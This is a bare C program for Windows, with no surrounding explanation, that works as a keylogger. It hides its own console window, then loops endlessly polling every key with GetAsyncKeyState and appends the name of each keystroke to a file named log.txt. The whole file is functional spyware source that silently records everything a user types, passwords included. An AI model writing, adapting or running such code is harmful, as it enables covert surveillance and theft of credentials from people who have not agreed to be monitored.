#include <windows.h>
#include <stdio.h>

int main()
{
  AllocConsole();
  ShowWindow(FindWindowA("ConsoleWindowClass",NULL),0);

  FILE *Log;
  short key;
  char szKey[MAX_PATH];
  int scan;

  while(1)
  {
    Sleep(10);
    for(key=0;key<256;key++)
    {
      if(GetAsyncKeyState(key)==-32767)
      {
        scan=MapVirtualKeyEx(key,0,GetKeyboardLayout(0));
        GetKeyNameText(scan << 16,szKey,MAX_PATH);
        Log=fopen ("log.txt","a+");
        fprintf(Log,"[%s]",szKey);
        fclose(Log);
      }
    }
  }
}
